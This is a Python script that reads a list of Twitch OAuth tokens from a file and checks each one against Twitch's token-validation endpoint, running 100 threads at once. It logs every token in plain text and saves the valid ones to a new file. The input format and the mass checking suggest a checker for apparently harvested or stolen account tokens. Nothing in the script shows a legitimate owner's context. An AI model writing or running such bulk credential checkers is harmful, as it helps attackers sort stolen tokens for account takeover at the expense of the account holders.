import requests
import concurrent.futures
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def is_token_valid(token):
    headers = {
        'Authorization': f'OAuth {token}'
    }
    response = requests.get('https://id.twitch.tv/oauth2/validate', headers=headers)
    if response.status_code == 200:
        logging.info(f'Token {token} is valid')
        return token
    else:
        logging.info(f'Token {token} is not valid')
        return None

tokens = []

with open('tokens.txt', 'r') as file:
    for line in file:
        token = line.split('|')[0].split('=')[1].strip()
        tokens.append(token)

with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    valid_tokens = list(filter(None, executor.map(is_token_valid, tokens)))

with open('valid_tokens.txt', 'w') as file:
    for token in valid_tokens:
        file.write(f"{token}\n")

logging.info(f"Valid tokens written to valid_tokens.txt")